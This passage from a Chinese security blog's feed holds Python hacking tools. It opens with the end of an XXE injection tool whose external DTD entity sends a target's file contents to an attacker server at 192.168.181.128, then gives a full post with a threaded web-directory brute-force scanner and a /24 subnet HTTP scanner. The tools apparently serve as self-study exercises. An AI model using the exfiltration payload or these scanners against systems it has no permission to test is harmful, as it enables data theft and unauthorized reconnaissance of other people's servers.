class="meta-keyword">file</span>.write("&lt;!<span class="meta-keyword">ENTITY</span> % <span class="meta-keyword">payload</span> \"&lt;!<span class="meta-keyword">ENTITY</span> &amp;<span class="meta-keyword">#x25</span>; <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> '<span class="meta-keyword">HTTP</span>://192.168.181.128/?<span class="meta-keyword">content</span>=%<span class="meta-keyword">file</span>;'&gt;\"&gt; %<span class="meta-keyword">payload</span>;")</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span>.close()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">web_server</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span>.start()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">send_data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span>.start()</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写sql注入-amp-xml注入工具&quot;&gt;&lt;a href=&quot;#python编写sql注入-amp-xml注入工具&quot; class=&quot;headerlink&quot; title=&quot;python编写sql注入&amp;amp;xml注入工具&quot;&gt;&lt;/a&gt;python编写sql
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写简单C段&amp;web目录扫描工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</id>
    <published>2020-04-20T04:41:18.000Z</published>
    <updated>2020-04-28T05:01:43.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> optparse import OptionParser</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class WEB_DIR(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.<span class="builtin-name">get</span>()</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">              pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line"></span><br><span class="line">def start(url,file,count):</span><br><span class="line">   <span class="built_in"> queue </span>= Queue()</span><br><span class="line">    f = open(<span class="string">'%s.txt'</span> % file, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        queue.put(url + i.strip(<span class="string">'\r\n'</span>))</span><br><span class="line">    threads = []</span><br><span class="line">    thread_count = int(count)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count):</span><br><span class="line">        threads.append(WEB_DIR(queue))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>,<span class="string">"--url"</span>,<span class="attribute">dest</span>=<span class="string">"url"</span>,help="Target url <span class="keyword">for</span> scan<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-f<span class="string">", "</span>--file<span class="string">", dest="</span>filename<span class="string">", help="</span>Dir filename<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-t<span class="string">", "</span>--thread<span class="string">", dest="</span>count<span class="string">",type=int,default=10, help="</span>scan thread count<span class="string">")</span></span><br><span class="line"><span class="string">    options,args = parser.parse_args()</span></span><br><span class="line"><span class="string">    if options.url and options.filename:</span></span><br><span class="line"><span class="string">        start(options.url,options.filename,options.count)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        parser.print_help()</span></span><br><span class="line"><span class="string">        sys.exit(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == '__main__':</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure><h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import ipaddr</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class C_Scan(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            r = 0</span><br><span class="line">            url = str(self._queue.<span class="builtin-name">get</span>())</span><br><span class="line">            url = <span class="string">'http://'</span>+url</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                    <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">'Usage: Python %s 192.168.1.1/24'</span>%(sys.argv[0])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        threads = []</span><br><span class="line">        threadnum = 250</span><br><span class="line">       <span class="built_in"> queue </span>= Queue()</span><br><span class="line">        cidrip = sys.argv[1]</span><br><span class="line">        ips = ipaddr.IPNetwork(cidrip)</span><br><span class="line">        <span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> ips:</span><br><span class="line">            queue.put(ip)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(threadnum):</span><br><span class="line">            threads.append(C_Scan(queue))</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"All Finished!!!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Python编写C段-amp-web目录扫描工具&quot;&gt;&lt;a href=&quot;#Python编写C段-amp-web目录扫描工具&quot; class=&quot;headerlink&quot; title=&quot;Python编写C段&amp;amp;web目录扫描工具&quot;&gt;&lt;/a&gt;Python编写C段&amp;amp
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
</feed>
